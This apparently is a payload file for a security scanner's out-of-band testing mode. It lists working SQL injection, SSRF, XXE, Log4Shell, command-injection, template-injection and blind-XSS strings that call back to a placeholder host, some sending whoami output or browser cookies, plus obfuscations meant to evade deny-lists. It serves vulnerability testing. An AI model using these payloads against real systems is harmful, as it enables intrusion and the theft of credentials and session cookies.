# Out-of-band (OOB) payload catalogue.
#
# Each payload contains the literal placeholder ``{OOB_URL}`` which
# the fuzzer replaces at runtime with ``<token>.<oob.domain>``. When
# the target backend processes the payload and dials out, the OOB
# server records the request; the post-scan correlator pairs the
# callback back to the payload and emits a CRITICAL finding.
#
# Opt in by pointing ``fuzzing.payloads_file`` at this file AND
# enabling ``oob.enabled`` with a ``oob.domain`` you control.

sql_injection:
  # MySQL / MariaDB
  - "1' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{OOB_URL}\\\\x'))--"
  # MSSQL
  - "1'; EXEC master.dbo.xp_dirtree '\\\\\\\\{OOB_URL}\\\\test'--"
  - "1'; EXEC master..xp_fileexist '\\\\\\\\{OOB_URL}\\\\x'--"
  # PostgreSQL
  - "1'; COPY (SELECT version()) TO PROGRAM 'curl http://{OOB_URL}/pgsql'--"
  - "1'; SELECT * FROM dblink('host={OOB_URL}', '')--"
  # Oracle UTL_HTTP / UTL_INADDR
  - "1' AND UTL_HTTP.REQUEST('http://{OOB_URL}/ora')--"
  - "1' AND UTL_INADDR.GET_HOST_ADDRESS('{OOB_URL}')--"

nosql_injection:
  - "{\"$where\": \"function(){return $.ajax({url:'http://{OOB_URL}/nosql'})}\"}"

ssrf:
  - "http://{OOB_URL}/ssrf"
  - "https://{OOB_URL}/ssrf"
  # IPv4 alternate encodings to evade allowlists
  - "http://{OOB_URL}#@127.0.0.1/"
  # gopher (some libraries follow it for SSRF)
  - "gopher://{OOB_URL}:80/_GET%20/%20HTTP/1.0"

xxe:
  - "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://{OOB_URL}/xxe\">]><x>&xxe;</x>"
  - "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % p SYSTEM \"http://{OOB_URL}/xxe-param\"> %p;]><x/>"

log4shell:
  - "${jndi:ldap://{OOB_URL}/log4j}"
  - "${jndi:dns://{OOB_URL}/log4j}"
  - "${jndi:rmi://{OOB_URL}/log4j}"
  # Obfuscated to bypass naive deny-lists
  - "${${::-j}${::-n}${::-d}${::-i}:ldap://{OOB_URL}/x}"
  - "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://{OOB_URL}/x}"

command_injection:
  - "; curl http://{OOB_URL}/cmd-$(whoami)"
  - "| wget -qO- http://{OOB_URL}/cmd"
  - "&& nslookup {OOB_URL}"
  - "$(curl http://{OOB_URL}/cmd-$(id))"
  - "`curl http://{OOB_URL}/bt-`whoami``"
  # PowerShell / Windows
  - "; powershell.exe -c \"Invoke-WebRequest http://{OOB_URL}/ps\""

ssti:
  # Server-side template injection that pulls a remote resource.
  # Useful when output is suppressed but the engine still resolves.
  - "{{lipsum.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://{OOB_URL}/ssti')}}"
  - "${T(java.net.URL).new('http://{OOB_URL}/sstij').openStream()}"

xss_blind:
  # Out-of-band XSS that pings the OOB server when the victim's browser
  # renders the payload. Useful for stored-XSS where the operator never
  # sees the rendered context.
  - "<script src=\"http://{OOB_URL}/xss\"></script>"
  - "<img src=x onerror=\"fetch('http://{OOB_URL}/xss-img?c='+document.cookie)\">"
  - "javascript:fetch('http://{OOB_URL}/xss-js?c='+document.cookie)"
